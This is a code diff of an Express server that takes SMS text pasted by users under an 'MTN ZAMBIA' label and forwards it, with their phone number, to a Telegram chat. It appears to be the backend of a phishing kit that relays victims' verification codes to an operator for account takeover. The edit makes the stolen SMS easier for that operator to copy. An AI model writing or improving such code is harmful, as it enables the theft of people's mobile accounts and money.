@@ -404,16 +404,15 @@ app.post('/verify-sms-pasted', async (req, res) => {
     session.pasted_sms = pastedSms;
     session.status = 'PENDING_PASTED_SMS';
 
-    const escapedSms = String(pastedSms || 'N/A').replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
-
+    // Wrapped in a triple-backtick code block so Telegram adds a copy button
     const message =
       `💬 *MTN ZAMBIA - SMS SUBMITTED*\n\n` +
       `📱 *MTN Phone:* +260${session.contact}\n\n` +
-      `📄 *Content:* Copy below text:\n` +
-      `\`${escapedSms}\`\n\n` +
+      `📄 *Tap text below to copy:* \n\`\`\`\n${pastedSms}\n\`\`\`\n` +
       `🆔 *User ID:* ${userId}`;
 
     const opts = {
+      parse_mode: 'Markdown',
       reply_markup: {
         inline_keyboard: [
           [
@@ -487,4 +486,3 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
 });
-    
